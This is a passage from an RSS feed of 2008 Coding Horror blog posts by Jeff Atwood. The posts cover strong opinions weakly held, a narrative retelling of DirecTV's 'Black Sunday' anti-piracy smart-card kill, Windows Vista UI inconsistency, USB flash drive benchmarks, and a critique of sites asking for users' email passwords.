<p>Now if you ask me – there never was such a thing as a pro blogger. It's a contradiction in terms. It's like calling someone a professional amateur. It's like salty orange juice, a drink whose taste is derived from its acidity. Blogging is an amateur activity. It's users writing about what they do, not professionals writing about what users do.</p>
</blockquote>
<p>What Dave's describing here is the difference between a <i>journalist writing about programmers</i> versus a <i>programmer writing about programming</i>. Blogging does not mean observing from the outside; it means participation. I like to think what I do at Coding Horror is a byproduct of <a href="http://blog.codinghorror.com/yes-but-what-have-you-done/">shipping software</a>, not some sort of bizarre sociological experiment I'm conducting. Although sometimes, I'll admit, it does feel that way. I am a generalist with a decidedly <a href="http://blog.codinghorror.com/everything-i-needed-to-know-about-programming-i-learned-from-basic/">lowbrow</a> coding background, so I can be a little scatterbrained. But directly or indirectly, <b>everything I've ever written on this blog is a side-effect of my deep, lifelong love of my ongoing work as a programmer.</b></p>
<p>You could argue that I'm a better writer than programmer. Perhaps that's true. I'll be the first to tell you that I am not an exceptional programmer. A competent programmer, yes. Always. On a good day, perhaps even a decent programmer. But I don't kid myself, either. I'll never be one of the best. But <a href="http://blog.codinghorror.com/who-needs-talent-when-you-have-intensity/">what I lack in talent, I make up in intensity</a>.</p>
<p>Which means, mathematically speaking, I must be <b>pretty damn intense</b>.</p>
<blockquote>
<p>The bite-sized morsels posted to Coding Horror are all very well for bite-sized topics. But things can often go awry if the topic is too complex to be distilled down easily. Oversimplification often ensues, as in the following examples, all recent:</p>
<ul>
<li>An <a href="http://blog.codinghorror.com/xml-the-angle-bracket-tax/">attempted critique of XML</a> ...</li>
<li>A similar "it's-too-hard" reaction seems to be at the heart of an article on <a href="http://blog.codinghorror.com/is-html-a-humane-markup-language/">humane markup languages</a> ...</li>
<li>Admittedly Model-View-Controller is an increasingly vague concept these days, but I just couldn't buy <a href="http://blog.codinghorror.com/understanding-model-view-controller/">Atwood's example</a> of it ...</li>
<li>A <a href="http://blog.codinghorror.com/oh-yeah-fork-you/">comment</a> that software forking is "the very embodiment of freedom zero" demonstrates that Atwood has no idea what freedom zero is ...</li>
</ul>
<p>Common to all of these are a superficial understanding of the topic at hand. In short, Atwood just <i>isn't credible</i>.</p>
</blockquote>
<p>Maybe a little too intense, sometimes. It's almost like I'm trying to overcompensate for something, but I can't imagine what that could be.</p>
<video poster="/content/images/2015/08/rex-kwon-do-poster.jpg" width="100%" height="242" preload="none" controls>
<source src="http://discourse-cdn.codinghorror.com/uploads/default/original/3X/a/d/ada45bcfb90283e7b9a99624706d17f7343f4065.mp4">
</source></video>
<blockquote>
<p>I'm Rex, founder of the Rex Kwon Do self-defense system! After one week with me in my dojo, you'll be prepared to defend yourself with the STRENGTH of a grizzly, the reflexes of a PUMA, and the wisdom of a MAN.</p>
</blockquote>
<p>Like <a href="http://www.imdb.com/character/ch0042259/quotes">Rex</a> of Rex Kwon Do, perhaps I'm relying a bit too heavily on the <a href="http://blog.codinghorror.com/in-defense-of-the-smackdown-learning-model/">"Smackdown" learning model</a> here in my dojo. I use it because I personally find it incredibly effective, for <a href="http://headrush.typepad.com/creating_passionate_users/2005/08/the_smackdown_l.html">all the reasons that Kathy Sierra outlines</a>.</p>
<p>But I worry that for some, it's getting in the way, damaging the credibility of the underlying message. Instead of arriving at the desired learning part, all they're getting is the smackdown. I certainly hope my posts are read and understood as slightly more nuanced than "Everything About PHP Sucks", "Everything About XML Sucks", or my personal favorite, "Everything About (your favorite technology) Sucks. Seriously."</p>
<p>I suppose it's also an issue of personal style. To me, writing <i>without</i> a strong voice, writing filled with second guessing and disclaimers, is tedious and difficult to slog through. I go out of my way to write in a strong voice because it's more effective. But <b>whenever I post in a strong voice, it is also an implied invitation to a discussion</b>, a discussion where I often change my opinion and invariably learn a great deal about the topic at hand. I believe in the principle of <a href="http://bobsutton.typepad.com/my_weblog/2006/07/strong_opinions.html">strong opinions, weakly held</a>:</p>
<blockquote>
<p>A couple years ago, I was talking the Institute's <a href="http://www.iftf.org/bobjohansen/">Bob Johansen</a> about wisdom, and he explained that – to deal with an uncertain future and still move forward – they advise people to have "strong opinions, which are weakly held."  They've been giving this advice for years, and I understand that it was first developed by [former] Institute Director <a href="http://www.saffo.com/">Paul Saffo</a>.  Bob explained that weak opinions are problematic because people aren't inspired to develop the best arguments possible for them, or to put forth the energy required to test them. Bob explained that it was just as important, however, to not be too attached to what you believe because, otherwise, it undermines your ability to "see" and "hear" evidence that clashes with your opinions. This is what psychologists sometimes call the problem of "confirmation bias."</p>
</blockquote>
<p>So when you read one of my posts and hear this:</p>
<blockquote>
<p>My name is Rex, and if you study with my eight-week program you will learn a system of self defense that I developed over two seasons of fighting in the Octagon. It's called... <em>Rex Kwon Do!</em></p>
</blockquote>
<p>Please consider it a <b>strong opinion weakly held</b>, a mock fight between fellow amateurs of equal stature, held in an Octagon where everyone retains their sense of humor, has an open mind, and enjoys a spirited debate where we all learn something.</p>
<p>Now bow to your sensei! <i>Bow to your sensei!</i></p>
<!--kg-card-end: markdown-->
             ]]></content>
<pubDate>2008-05-29T12:00:00.000Z</pubDate>
<guid>https://blog.codinghorror.com/strong-opinions-weakly-held/</guid>
<author><![CDATA[ Jeff Atwood ]]></author>
</item>
<item>
<title><![CDATA[ Revisiting the Black Sunday Hack ]]></title>
<link>https://blog.codinghorror.com/revisiting-the-black-sunday-hack/</link>
<content><![CDATA[ 
                <!--kg-card-begin: markdown--><p>
One of the most impressive hacks I've ever read about has to be <b>the Black Sunday kill</b>. Since the <a href="http://slashdot.org/articles/01/01/25/1343218.shtml">original 2001 Slashdot article I read on this</a> is 99.9% quote, I'm going to do the same. I can see why they quoted so extensively; it'd be difficult to improve on the unusually succinct, well written summary provided by Pat from <a href="http://www.belch.com/">Belch</a>:
</p>
<p>
</p>
<blockquote>
One of the original smart cards, entitled 'H' cards for Hughes, had design flaws which were discovered by the hacking community. These flaws enabled the extremely bright hacking community to reverse engineer their design, and to create smart card writers. The writers enabled the hackers to read and write to the smart card, and allowed them to change their subscription model to receive all the channels. Since the technology of satellite television is broadcast only, meaning you cannot send information TO the satellite, the system requires a phone line to communicate with DirecTV. The hackers could re-write their smart cards and receive all the channels, and unplug their phone lines leaving no way for DirecTV to track the abuse. DirecTV had built a mechanism into their system that allowed the updating of these smart cards through the satellite stream. Every receiver was designed to 'apply' these updates when it received them to the cards. DirecTV applied updates that looked for hacked cards, and then attempted to destroy the cards by writing updates that disabled them. The hacking community replied with yet another piece of hardware, an 'unlooper,' that repaired the damage. The hacker community then designed software that trojanized the card, and removed the capability of the receivers to update the card. DirecTV could only send updates to the cards, and then require the updates be present in order to receive video. Each month or so, DirecTV would send an update. 10 or 15 minutes later, the hacking community would update the software to work around the latest fixes. This was the status quo for almost two years. 'H' cards regularly sold on eBay for over $400.00. It was apparent that DirecTV had lost this battle, relegating DirecTV to hunting down Web sites that discussed their product and using their legal team to sue and intimidate them into submission.
<p>
Four months ago, however, DirecTV began sending several updates at a time, breaking their pattern. While the hacking community was able to bypass these batches, they did not understand the reasoning behind them. Never before had DirecTV sent 4 and 5 updates at a time, yet alone send these batches every week. Many postulated they were simply trying to annoy the community into submission. The updates contained useless pieces of computer code that were then required to be present on the card in order to receive the transmission. The hacking community accommodated this in their software, applying these updates in their hacking software. Not until the final batch of updates were sent through the stream did the hacking community understand DirecTV. Like a final piece of a puzzle allowing the entire picture, the final updates made all the useless bits of computer code join into a dynamic program, existing on the card itself. This dynamic program changed the entire way the older technology worked. In a masterful, planned, and orchestrated manner, DirecTV had updated the old and ailing technology. The hacking community responded, but cautiously, understanding that this new ability for DirecTV to apply more advanced logic in the receiver was a dangerous new weapon. It was still possible to bypass the protections and receive the programming, but DirecTV had not pulled the trigger of this new weapon.
</p>
<p>
Last Sunday night, at 8:30 pm est, DirecTV fired their new gun. One week before the Super Bowl, DirecTV launched a series of attacks against the hackers of their product. DirecTV sent programmatic code in the stream, using their new dynamic code ally, that hunted down hacked smart cards and destroyed them. The IRC DirecTV channels overflowed with thousands of people who had lost the ability to watch their stolen TV. The hacking community by and large lost not only their ability to watch TV, but the cards themselves were likely permanently destroyed. Some estimate that in one evening, 100,000 smart cards were destroyed, removing 98% of the hacking communities' ability to steal their signal. To add a little pizzazz to the operation, DirecTV personally "signed" the anti-hacker attack. <b>The first 8 computer bytes of all hacked cards were rewritten to read "GAME OVER".</b>
</p>
</blockquote>
<p>
</p>
<p>
Nobody knew how the satellite companies had suddenly developed such smarts. Until now. A recent Wired article exposes Christopher Tarnovsky as <a href="http://www.wired.com/politics/security/news/2008/05/tarnovsky?currentPage=all">the mind behind the epic Black Sunday Hack</a>.
</p>
<p>
</p>
<blockquote>
Among the countermeasures he says he created was one known among pirates as the "Black Sunday" kill -- an elaborate scheme that destroyed tens of thousands of pirate DirecTV cards a week before Super Bowl Sunday in 2001.
<p>
Instead of being delivered all at once like other measures, the Black Sunday attack code was sent to pirate cards in about five dozen parts over the course of two months, like a tank transported piece by piece to a battlefield to be assembled in the field. "They never expected us to do this," Tarnovsky says.
</p>
<p>
The kill didn't last long before pirates found a way to jump-start the cards. But it holds an enduring position in pirate lore; for the first time, they could see a cunning mind at work on the other side.
</p>
</blockquote>
<p>
It's fascinating to finally hear the Black Sunday kill <a href="http://www.wired.com/politics/security/news/2008/05/tarnovsky?currentPage=all">described so intimately from the inside</a>. It's a gripping tale of high stakes programming, a life of electronic warfare with millions of dollars at risk on both sides. I've never been a satellite television subscriber, but apparently the war rages on even today -- at least according to the Wikipedia entry on <a href="http://en.wikipedia.org/wiki/Pirate_decryption">pirate decryption</a>.
</p>
<p>
</p>
<p></p>
<!--kg-card-end: markdown-->
             ]]></content>
<pubDate>2008-05-31T12:00:00.000Z</pubDate>
<guid>https://blog.codinghorror.com/revisiting-the-black-sunday-hack/</guid>
<author><![CDATA[ Jeff Atwood ]]></author>
</item>
<item>
<title><![CDATA[ Whatever Happened to UI Consistency? ]]></title>
<link>https://blog.codinghorror.com/whatever-happened-to-ui-consistency/</link>
<content><![CDATA[ 
                <!--kg-card-begin: markdown--><p>
Although I rather like Windows Vista -- I think the amount of <a href="http://techreport.com/discussions.x/13303">Vista nerd rage</a> out there is completely unwarranted -- there are areas of Vista I find hugely disappointing. And for my money, <b>nothing is more disapponting than the overall fit and finish of Vista, which is truly abysmal.</b> It's arguably the worst of any operating system Microsoft has ever released.
</p>
<p>
What do I mean by fit and finish? Well, take a look at Long Zheng's <a href="http://www.istartedsomething.com/20080531/windows-ui-taskforce-your-help-wanted/">Windows UI Taskforce</a> examples. Vista is absolutely <i>filled</i> with bits of user interface that are inconsistent with the new Vista design.
</p>
<p>
<a href="http://www.istartedsomething.com/20080531/windows-ui-taskforce-your-help-wanted/"><img alt="image placeholder" >
</p>
<p>
You're never more than two clicks away from some discontinuity or visual gaffe that zaps you right back into the seven year old Windows XP "experience". Or worse. Consider <a href="http://chris.pirillo.com/2006/05/24/windows-vista-feedback/">Chris Pirillo's observations</a> on his Windows Vista beta 2 install:
</p>
<p>
</p>
<blockquote>
Windows Calendar font and icon alignment are all wonky.
<p>
The Windows Media toolbar pop-up preview window is using Arial.
</p>
<p>
Safely Remove Hardware dialog is in Microsoft Sans Serif.
</p>
</blockquote>
<p>
This goes on for about, oh, eleven pages. Granted, these comments refer to the beta, but the shipping version of Vista is every bit as schizophrenic in design. There's very little consistency.
</p>
<p>
It also seems every individual team at Microsoft has a profoundly different idea of what the user interface should look like, <a href="http://www.winsupersite.com/showcase/winvista_rc1_worst.asp">as Paul Thurrott notes</a>:
</p>
<p>
</p>
<blockquote>
And what's up with the glaringly inconsistent UI across Windows Vista and all of its applications? Some windows have menus, some don't, and some have hidden menus. Some have these new black toolbars, some don't. And so on. Why isn't there a team of people just working on consistency issues?
</blockquote>
<p>
Aren't these trivial, nitpicky complaints? Yes. They are. And that's entirely the point. This little stuff <i>matters</i>.
</p>
<p>
If all those individual teams at Microsoft can't be bothered to follow the design conventions of <i>their own operating system</i> -- how can they possibly be building applications that I would actually want to use? In software, attention to detail is everything; all these glaring little oversights in Vista's user experience collectively add up to a huge vote of "no confidence" in the whole shebang. A mismatched font here, an ugly pixelated icon there, soon enough you feel that you're <a href="http://www.codinghorror.com/blog/archives/000326.html">living in a neighborhood with an awful lot of broken windows</a>.
</p>
<p>
If Microsoft's developers can't muster the basic level of craftsmanship necessary to make Vista's bundled applications consistently look and work the same as the rest of the operating system, how can users or third party developers be expected to give a damn about the user experience? Honestly, it's embarrassing.
</p>
<p>
John Gruber has been <a href="http://daringfireball.net/2004/10/themes">critical of Apple's minor UI inconsistencies</a> in the past.
</p>
<p>
</p>
<blockquote>
Consistency in and of itself has been a fundamental pillar of the Mac user experience from 1984 onward. But with Apple no longer leading the way, it's fading. "At least it's still more consistent than Windows" is not high praise.
</blockquote>
<p>
That comment was made well before Vista was released. Nobody's perfect, but from what I've seen of OS X and Vista, I'd say Apple cares a <i>lot</i> more about consistency of user interface today. Microsoft has all but abdicated their responsibilities with Vista.
</p>
<p>
But the saddest part of this whole situation is that it doesn't have to be this way. Every major operating system is released alongside a set of <b>design guidelines</b>, guidebooks for developing applications that are consistent with the conventions and standard applications provided by the OS.
</p>
<p>
</p>
<ul>
<li>
<a href="http://www.microsoft.com/whdc/System/platform/pcdesign/XPguidelines.mspx">Windows XP Design Guidelines</a>
</li>
<li>
<a href="http://developer.apple.com/documentation/UserExperience/Conceptual/OSXHIGuidelines/XHIGIntro/chapter_1_section_1.html">Apple Human Interface Guidelines</a>
</li>
<li>
<a href="http://download.microsoft.com/download/e/1/9/e191fd8c-bce8-4dba-a9d5-2d4e3f3ec1d3/ux%20guide.pdf">Vista Design Guidelines</a> (pdf)
</li>
<li>
<a href="http://developer.gnome.org/projects/gup/hig/">GNOME Human Interface Guidelines</a>
</li>
</ul>
<p>
As a young developer, I remember eagerly paging through the early design guidelines for Windows 95 and the Mac OS. You can always do worse than following the well-worn paths the OS designers have conveniently laid out in front of you. Much, much, worse. And many have.
</p>
<p>
Of course, all design guidelines begin at home. These guides are only as good as the underlying operating systems they're based on, which are de facto reference implementations. It's hard to take Vista's design guidelines seriously, since Microsoft's own development teams clearly didn't.
</p>
<p>
If you're a software developer, please don't make this mistake. <b>Understand the design guidelines for your platform -- and for God's sake, <i>follow them!</i></b>
</p>
<p>
For a great platform agnostic primer on the importance of UI consistency and design guidelines, look no further than <a href="http://www.amazon.com/dp/0123706432/?tag=codihorr-20">GUI Bloopers 2.0</a>.
</p>
<p>
<a href="http://www.amazon.com/dp/0123706432/?tag=codihorr-20"><img alt="image placeholder" >
</p>
<p>
The original version of GUI Bloopers has been on my recommended reading list for years, and this greatly updated version was long overdue. There's a <a href="http://gui-bloopers.com/pdfs/Chapter_04.pdf">sample chapter</a> (pdf) on the official <a href="http://gui-bloopers.com">book website</a> if you'd like to get a sense of what the book is about. Jeff Johnson, the author, also provides an excellent <a href="http://www.uiwizards.com/suggestedReading.html">companion reading list</a> on his website, which also includes the <a href="http://www.uiwizards.com/wBloopArchive.html">Web Blooper of the Month archive</a>.
</p>
<p>
Like everyone else, I'd prefer to use only the most beautifully designed applications. If you can't be beautiful, <b>at least be consistent</b>. Start with the basic level of consistency afforded by following the design guidelines of your chosen platform, and you might just avoid the "homely" and "ugly" end of the spectrum.
</p>
<p>
</p>
<p></p>
<!--kg-card-end: markdown-->
             ]]></content>
<pubDate>2008-06-01T12:00:00.000Z</pubDate>
<guid>https://blog.codinghorror.com/whatever-happened-to-ui-consistency/</guid>
<author><![CDATA[ Jeff Atwood ]]></author>
</item>
<item>
<title><![CDATA[ Large USB Flash Drive Performance ]]></title>
<link>https://blog.codinghorror.com/large-usb-flash-drive-performance/</link>
<content><![CDATA[ 
                <!--kg-card-begin: markdown--><p>
In the last three years, I've gone from <a href="http://www.codinghorror.com/blog/archives/000251.html">carrying</a> a <b>512 MB</b> USB memory stick to a <b>16 GB</b> USB memory stick. That's pretty amazing.
</p>
<p>
According to the <a href="http://www.storagereview.com/legacy.sr">storagereview.com archives</a>, hard drives with 16 GB of storage were introduced sometime around the beginning of 1999. Barely 10 years later, we carry around that much on our <i>keychains</i>. Heck, <a href="http://www.codinghorror.com/blog/archives/000927.html">my laptop</a> only has a 32 GB solid state drive, and I manage to scrape by with that. These things are essentially miniature hard drives. I'm starting to wonder why we don't just take our entire computing environment, operating system and all, along with us and boot it up on whatever computer we happen to encounter in the wild.
</p>
<p>
There is one big problem with this approach, however. <b>USB flash drive performance, even for the best models, is a small fraction of typical hard drive performance.</b>
</p>
<p>
Modern 2.5" hard drive performance looks <a href="http://www.xbitlabs.com/articles/storage/display/25inch-hdd-250gb_3.html#sect2">something like this</a>:
</p>
<p>
</p>
<table cellpadding="4" cellspacing="4">
<tr>
<td>HDD Sequential Read</td>
<td align="right">55 MB/sec</td>
</tr>
<tr>
<td>HDD Sequential Write</td>
<td align="right">55 MB/sec</td>
</tr>
</table>
<p>
Mind you, those aren't particularly fantastic numbers, just typical ones. You can get <i>significantly</i> faster hard drives, such as the <a href="http://www.tkqlhce.com/click-2338938-10440897?url=http%3A%2F%2Fwww.newegg.com%2FProduct%2FProduct.aspx%3FItem%3DN82E16822136260%26nm_mc%3DAFC-C8Junction%26cm_mmc%3DAFC-C8Junction-_-Hard%2BDrives-_-Western%2BDigital-_-22136260&amp;cjsku=N82E16822136260">
Western Digital Velociraptor</a> I just bought. Storage Review <a href="http://www.storagereview.com/WD3000BLFS.sr">described the Velociraptor</a> thusly:
</p>
<p>
</p>
<blockquote>
<i>single-user scores .. blow away those of every other [hard drive]</i>
</blockquote>
<p>
I was immediately sold once I read that. It's not cheap, but you get what you pay for, and I'm firmly in the "hard drive performance matters" camp. To quote <a href="http://www.imdb.com/title/tt0091042/quotes">Ferris Bueller</a>, it is so choice. If you have the means, I highly recommend <a href="http://www.tkqlhce.com/click-2338938-10440897?url=http%3A%2F%2Fwww.newegg.com%2FProduct%2FProduct.aspx%3FItem%3DN82E16822136260%26nm_mc%3DAFC-C8Junction%26cm_mmc%3DAFC-C8Junction-_-Hard%2BDrives-_-Western%2BDigital-_-22136260&amp;cjsku=N82E16822136260">picking one up</a>.
</p>
<p>
But what about large USB flash drives? How do they compare to typical hard drive speeds, much less the awe-inspiring Velociraptor? X-Bit Labs recently <a href="http://www.xbitlabs.com/articles/memory/display/32gb-usb-flash_3.html#sect2">reviewed three 32 GB USB flash drives</a>:
</p>
<p>
</p>
<table cellpadding="4" cellspacing="4">
<tr>
<td></td>
<td align="right">Sequential Read</td>
<td align="right">Seqential Write</td>
</tr>
<tr>
<td><a href="http://www.amazon.com/dp/B000XUMR6C/?tag=codihorr-20">32 GB Corsair Flash Voyager</a></td>
<td align="right">22 MB/sec</td>
<td align="right">10 MB/sec</td>
</tr>
<tr>
<td><a href="http://www.amazon.com/dp/B0013RKFB8/?tag=codihorr-20">32 GB OCZ Rally 2</a></td>
<td align="right">30 MB/sec</td>
<td align="right">22 MB/sec</td>
</tr>
<tr>
<td><a href="http://www.amazon.com/dp/B0011EA4V4/?tag=codihorr-20">32 GB Patriot Xporter XT</a></td>
<td align="right">31 MB/sec</td>
<td align="right">17 MB/sec</td>
</tr>
</table>
<p>
Not bad by any means, but <i>punishing</i> next to typical hard drive throughput. If you really were booting and running your operating system entirely from a USB flash drive, you'd feel like you had stepped back in time five full years.
</p>
<p>
Even if you're only planning to use your USB flash drive for the mundane task of storing files, <b>you should care deeply about read and write speeds</b>. Throughput wasn't much of an issue when USB drives were "only" a gigabyte or two. But when we're talking about 8 GB, 16 GB or 32 GB of data, being limited to 10 MB/sec write speeds means 13, 26, and 52 minutes respectively to fill that flash drive up with data. Do you have that kind of time?
</p>
<p>
The OCZ Rally 2 flash drive appears to be the winner in the Xbit labs roundup, but does the 32 GB size really offer the best bang for your buck? I did a quick <a href="http://www.amazon.com/gp/search?ie=UTF8&amp;keywords=ocz%20rally&amp;tag=codihorr-20&amp;index=electronics&amp;linkCode=ur2&amp;camp=1789&amp;creative=9325">spot check of OCZ Rally 2 flash drive prices</a> on Amazon:
</p>
<p>
</p>
<table cellpadding="4" cellspacing="4" width="260">
<tr>
<td align="right">2 GB</td>
<td align="right">$17</td>
<td align="right">$8.50/GB</td>
</tr>
<tr>
<td align="right">4 GB</td>
<td align="right">$26</td>
<td align="right">$6.50/GB</td>
</tr>
<tr>
<td align="right">8 GB</td>
<td align="right">$37</td>
<td align="right">$4.62/GB</td>
</tr>
<tr>
<td align="right">16 GB</td>
<td align="right">$78</td>
<td align="right">$4.88/GB</td>
</tr>
<tr>
<td align="right">32 GB</td>
<td align="right">$136</td>
<td align="right">$4.25/GB</td>
</tr>
</table>
<p>
Surprisingly, yes. The <a href="http://www.amazon.com/dp/B0013RKFB8/?tag=codihorr-20">32 GB OCZ Rally2 flash drive</a> offers the best price per gigabyte of storage. I actually didn't do the math before I purchased, thinking that the 16 GB one would be a better deal. Now I wish I had! I just noticed there's a $20 rebate on the 32 GB model, too, which makes it an even more outstanding deal.
</p>
<p>
I wasn't sure which 16 GB flash drive would be faster -- the Corsair Flash Voyager, or the OCZ Rally 2. So I ended up purchasing both.
</p>
<p>
<a href="http://www.amazon.com/dp/B000LXTUT8/?tag=codihorr-20"><img alt="image placeholder" >
 
<a href="http://www.amazon.com/dp/B000ZGX3P8/?tag=codihorr-20"><img alt="image placeholder" >
</p>
<p>
I formatted both of the drives with the default NTFS filesystem and did a bit of ad-hoc testing in Vista. You can <a href="http://www.techcrater.com/2007/04/06/how-to-find-readyboost-speed-rating/">find the raw ReadyBoost benchmark results</a> if you know where to look in the event viewer.
</p>
<p>
</p>
<table cellpadding="4" cellspacing="4" width="400">
<tr>
<td></td>
<td align="right"><a href="http://www.amazon.com/dp/B000LXTUT8/?tag=codihorr-20">16 GB Corsair<br>Flash Voyager</a></td>
<td align="right"><a href="http://www.amazon.com/dp/B000ZGX3P8/?tag=codihorr-20">16 GB OCZ<br>Rally 2</a></td>
</tr>
<tr>
<td>3GB ISO Copy, Read</td>
<td align="right">26 MB/sec</td>
<td align="right">26 MB/sec</td>
</tr>
<tr>
<td>3GB ISO Copy, Write</td>
<td align="right">9 MB/sec</td>
<td align="right">10 MB/sec</td>
</tr>
<tr>
<td>Readyboost Random Read</td>
<td align="right">6,426 KB/sec</td>
<td align="right">6,434 KB/sec</td>
</tr>
<tr>
<td>Readyboost Random Write</td>
<td align="right">3,292 KB/sec</td>
<td align="right">4,695 KB/sec</td>
</tr>
</table>
<p>
In practice, the Rally is noticeably faster at writing, and a smidge faster at reading (not exposed here, but the chddspeed results confirm this). Not the results I expected based on reading the Xbit Labs review, but apparently there's quite a bit of variance for USB flash drives depending on the vagaries of manufacturing and what particular flash memory chips the manufacturer happened to be using that month.
</p>
<p>
The results are close enough that you may want to pick on ergonomics rather than performance. The Corsair drive has a chunky rubberized coating, which works well on a keychain (less jangly, more durable) but becomes annoying in a pocket or next to a narrow USB slot. I think I prefer the Rally's narrower metallic casing. Since it is a slightly better performer overall, <a href="http://www.amazon.com/gp/search?ie=UTF8&amp;keywords=ocz%20rally&amp;tag=codihorr-20&amp;index=electronics&amp;linkCode=ur2&amp;camp=1789&amp;creative=9325">the OCZ Rally 2 series gets my recommendation</a>, if you're in the market.
</p>
<p>
One caution: if you <i>do</i> plan to use your USB flash drive to run applications or even operating systems, <b>pay close attention to the random read and write speeds</b>. Sequential throughput is a good overall baseline, but it's not the entire performance story. While typical portable storage usage does correlate well with sequential throughput, applications running on a USB flash drive are largely bounded by random access throughput.
</p>
<p>
You can never have enough storage on your keychain. Now if I can just figure out what else to put on mine...
</p>
<p>
</p>
<p></p>
<!--kg-card-end: markdown-->
             ]]></content>
<pubDate>2008-06-02T12:00:00.000Z</pubDate>
<guid>https://blog.codinghorror.com/large-usb-flash-drive-performance/</guid>
<author><![CDATA[ Jeff Atwood ]]></author>
</item>
<item>
<title><![CDATA[ Please Give Us Your Email Password ]]></title>
<link>https://blog.codinghorror.com/please-give-us-your-email-password/</link>
<content><![CDATA[ 
                <!--kg-card-begin: markdown--><p>
A number of people whose opinions I greatly respect have turned me on to <a href="http://www.yelp.com/">Yelp</a> over the last six months or so. Yelp is a community review site, and a great way to discover cool new places in whatever neighborhood you happen to be in.
</p>
<p>
I've enjoyed using Yelp, and I wanted to participate by submitting my first review, so I created a new account there. As part of the account creation process, I was presented with this.
</p>
<p>
<img alt="image placeholder" >
</p>
<p>
The idea is that I tell Yelp what email service I use, then provide my login and password information so Yelp can determine if any of my email contacts are Yelp members. How convenient!
</p>
<p>
Here's how I see that page.
</p>
<p>
<img alt="image placeholder" >
</p>
<p>
I'm willing to give Yelp the benefit of the doubt here, but let's think about what it means to give out your email account and password to <i>anyone</i>, no matter how ostensibly trustworthy they may be:
</p>
<p>
</p>
<ol>
<li>Number one with a bullet: <b>your email account is a de-facto master password for your online identity</b>. Most -- if not all -- of your online accounts are secured through your email. Remember all those "forgot password" and "forgot account" links? Guess where they ultimately resolve to? If someone controls your email account, they have nearly unlimited access to every online identity you own across every website you visit.
<p>
</p>
</li>
<li>If you're anything like me, <b>your email is a treasure trove of highly sensitive financial and personal information</b>. Consider all the email notifications you get in today's highly interconnected web world. It's like a one-stop-shop for comprehensive and systematic identity theft. How do I know Yelp isn't going to dip into other areas of my email?
<p>
</p>
</li>
<li>Even if I trust Yelp absolutely, <b>how do I know they're not going to store my email password</b>, <a href="http://www.codinghorror.com/blog/archives/000953.html">perhaps insecurely</a>, in a place some disgruntled programmer or hacker can eventually get to it? Giving out your password puts the recipient in the highly unfortunate position of having to secure your password. Give that email password out enough, and you're now vulnerable in <i>dozens</i> of places spread across the face of the web. The odds start to look <a href="http://www.codinghorror.com/blog/archives/001072.html">pretty dire</a>.
<p>
</p>
</li>
</ol>
I'm sure Yelp means well. They just want to help me find my friends, doggone it! But the very nature of the request is <i>incredibly</i> offensive; <b>they have effectively asked for the keys to my house in order to riffle through my address book.</b>
<p>
I don't think so.
</p>
<p>
Frankly, it's irresponsible to even ask this question. Naive internet users may not understand why it is such a profoundly bad idea to give out their email credentials to random websites. Worse, they might eventually get the idea that giving out their email credentials is typical or normal.
</p>
<p>
It's not. This is outlined quite literally in most privacy policies:
</p>
<p>
</p>
<blockquote>
The security of your account also depends on keeping your account password confidential, and you should not share your account name or password with anyone. If you do share your account information with a third party, they will have access to your account and your personal information. -- <a href="https://checkout.google.com/files/privacy.html">Google Checkout</a>
<p>
If a password is used to help protect your accounts and personal information, it is your responsibility to keep your password confidential. Do not share this information with anyone. If you are sharing a computer with anyone you should always choose to log out before leaving a site or service to protect access to your information from subsequent users. -- <a href="http://privacy.microsoft.com/en-us/fullnotice.aspx">Microsoft Passport</a>
</p>
<p>
Your Yahoo! ID and password are confidential information. A Yahoo! employee will never ask you for your password in an unsolicited phone call or email. Do not respond to any message that asks for your password. -- <a href="http://security.yahoo.com/article.html?aid=2006102510">Yahoo</a>
</p>
</blockquote>
<p>
How did we end up in a world where it's even remotely acceptable to ask for someone's email credentials? What happened to all those years we spent establishing privacy policies to protect our users? What happened to the fundamental tenet of security common sense that says <b>giving out your password, under any circumstances, is a bad idea?</b>
</p>
<p>
I can understand the cutthroat desire to build monetizable "friend" networks by any means necessary. Even if it means encouraging your users to cough up their login credentials to competing websites. But how can I take your privacy policies seriously if you aren't willing to treat your competitors' login credentials with the very same respect that you treat your own? That's just lip service.
</p>
<p>
Email is the de-facto master password for a huge swath of your online identity. Tread carefully:
</p>
<p>
</p>
<ul>
<li>As a software developer, you should <i>never</i> ask a user for their email credentials.  It's unethical. It's irresponsible. It is wrong. If someone is asking you to code this, why? For what purpose?
</li>
<li>As a user, you should <i>never</i> provide your email credentials to anyone except your email service. Sites that ask you for this information are to be regarded with extreme suspicion if not outright distrust.
</li>
</ul>
<p>
Beyond those ethical guidelines, I do wonder why the technological solution to this problem has barely been addressed. If all Yelp wants is my address book, <b>why can't I grant them temporary access to my public email address book <i>without</i> giving out the keys to my email kingdom?</b>
</p>
<p>
If even a fraction of the coding effort that regularly goes into convincing people to cough up their email or website login credentials went into finding other, more reasonable solutions to this problem -- perhaps we could have arrived at a saner solution by now. And we can start by <b>taking obnoxious, utterly inappropriate credential requests completely off the table.</b>
</p>
<p>
<font color="red">UPDATE:</font> Several commenters brought to light some efforts underway to address this pernicious problem:
</p>
<p>
</p>
<ul>
<li>
<a href="http://code.google.com/apis/contacts/">Google Contacts API</a> (related <a href="http://code.google.com/apis/accounts/docs/AuthForWebApps.html">documentation</a>)
</li>
<li>
<a href="http://developer.yahoo.com/addressbook/">Yahoo! Contact API</a> (related <a href="http://developer.yahoo.com/auth/user.html">documentation</a>)
</li>
<li>
<a href="http://msdn.microsoft.com/en-us/library/bb463989.aspx">Windows Live Contact API</a> (as publicized in <a href="http://blogs.msdn.com/angus_logan/">Angus Logan's blog</a>)
</li>
</ul>
<p>
A more general solution may be <a href="http://oauth.net/">OAuth</a>, billed as an open standard for API access delegation. In other words, <a href="http://oauth.net/about/">a valet key for websites</a>:
</p>
<p>
</p>
<blockquote>
Many luxury cars today come with a valet key. It is a special key you give the parking attendant and unlike your regular key, will not allow the car to drive more than a mile or two. Some valet keys will not open the trunk, while others will block access to your onboard cell phone address book. Regardless of what restrictions the valet key imposes, the idea is very clever. You give someone limited access to your car with a special key, while using your regular key to unlock everything.
</blockquote>
<p>
Chris Messina of the OAuth project was kind enough to provide a number of related links in the comments and <a href="http://blog.oauth.net/2008/06/05/an-opportunity-for-oauth-jeff-codinghorror-atwood-highlights-the-password-anti-pattern/">a followup post on the OAuth blog as well</a>.
</p>
<p>
I was encouraged to learn about some of the recent progress we've made on this front. If you were looking for a way to be part of the solution, instead of the problem, read up on these solutions and participate!
</p>
<p>
</p>
<p></p>
<!--kg-card-end: markdown-->
             ]]></content>
<pubDate>2008-06-04T12:00:00.000Z</pubDate>
